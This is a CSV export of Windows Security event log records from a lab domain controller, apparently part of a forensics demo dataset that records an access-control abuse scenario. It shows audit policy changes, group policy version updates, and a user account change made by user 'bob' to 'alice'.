16,198238055,2019-03-25 10:36:03.9746084,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8274 SubcategoryId: %%12811,SubcategoryGuid: 0cce9244-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8449,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8274""},{""@Name"":""SubcategoryId"",""#text"":""%%12811""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce9244-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8449""}]}}"
17,198238291,2019-03-25 11:05:30.6956180,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2112,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\DC1$,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%7688, )",AccessMask: Unknown code (0x100),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0xB3AC2""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7688, ""},{""@Name"":""AccessMask"",""#text"":""0x100""},{""@Name"":""Properties"",""#text"":""%%7688, {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
18,198238401,2019-03-25 11:14:33.7216339,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2112,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
19,198238408,2019-03-25 11:14:42.4896235,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
20,198238409,2019-03-25 11:14:43.5666443,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2112,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""5d540f5d-9734-41fb-865c-6ba6ef4269e4""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65556""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
21,198238410,2019-03-25 11:14:43.5666443,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2112,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""5d540f5d-9734-41fb-865c-6ba6ef4269e4""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65557""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
22,198238411,2019-03-25 11:14:43.5666443,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2112,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""4396b334-2a04-4cff-a90e-4c079e35265b""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65557""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
23,198238412,2019-03-25 11:14:43.5666443,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2112,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""4396b334-2a04-4cff-a90e-4c079e35265b""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65558""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
24,198238428,2019-03-25 11:14:50.7556088,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8278 SubcategoryId: %%13824,SubcategoryGuid: 0cce9235-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8449,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8278""},{""@Name"":""SubcategoryId"",""#text"":""%%13824""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce9235-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8449""}]}}"
25,198238429,2019-03-25 11:14:50.7556088,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8278 SubcategoryId: %%13829,SubcategoryGuid: 0cce923a-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8449,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8278""},{""@Name"":""SubcategoryId"",""#text"":""%%13829""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce923a-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8449""}]}}"
26,198238499,2019-03-25 11:15:58.2396011,4738,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3948,DC1.insecurebank.local,0,,A user account was changed,insecurebank\bob,,Target: insecurebank\alice,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: - AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: -,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""Dummy"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""alice""},{""@Name"":""TargetDomainName"",""#text"":""insecurebank""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1107""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3CADE20""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""-""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""}]}}"
27,198238510,2019-03-25 11:18:39.4656272,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
28,198238512,2019-03-25 11:18:40.7686343,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2260,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""b5a111cf-be68-4c60-9412-e0c6777d4522""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65558""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
29,198238513,2019-03-25 11:18:40.7686343,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2260,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""b5a111cf-be68-4c60-9412-e0c6777d4522""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65559""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
30,198238519,2019-03-25 11:19:07.1866306,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
31,198238520,2019-03-25 11:19:10.7706088,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""91dbe69c-c6d0-4457-a39a-eba1400e7813""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65559""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
32,198238521,2019-03-25 11:19:10.7706088,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""91dbe69c-c6d0-4457-a39a-eba1400e7813""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65560""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
33,198238537,2019-03-25 11:19:22.5906203,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2260,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8274 SubcategoryId: %%12804,SubcategoryGuid: 0cce9227-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8449,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8274""},{""@Name"":""SubcategoryId"",""#text"":""%%12804""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce9227-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8449""}]}}"
34,198238538,2019-03-25 11:19:22.5906203,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2260,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8278 SubcategoryId: %%13825,SubcategoryGuid: 0cce9236-69ae-11d9-bed3-505054503030,AuditPolicyChanges: %%8449,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8278""},{""@Name"":""SubcategoryId"",""#text"":""%%13825""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce9236-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8449""}]}}"
